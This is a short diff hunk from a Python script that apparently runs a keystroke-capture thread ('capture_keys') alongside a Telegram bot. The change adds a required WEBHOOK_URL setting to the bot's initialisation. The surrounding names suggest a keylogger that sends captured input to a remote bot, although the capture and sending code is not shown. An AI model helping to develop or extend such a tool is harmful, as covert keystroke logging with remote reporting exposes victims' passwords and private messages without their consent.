@@ -167,4 +167,7 @@ if __name__ == "__main__":
     threading.Thread(target=capture_keys, daemon=True).start()
 
     # Start the bot
-    initialize(TELEGRAM_API_KEY)
+    WEBHOOK_URL = os.getenv('WEBHOOK_URL')
+    if not WEBHOOK_URL:
+        raise ValueError("WEBHOOK_URL environment variable not set")
+    initialize(TELEGRAM_API_KEY, WEBHOOK_URL)
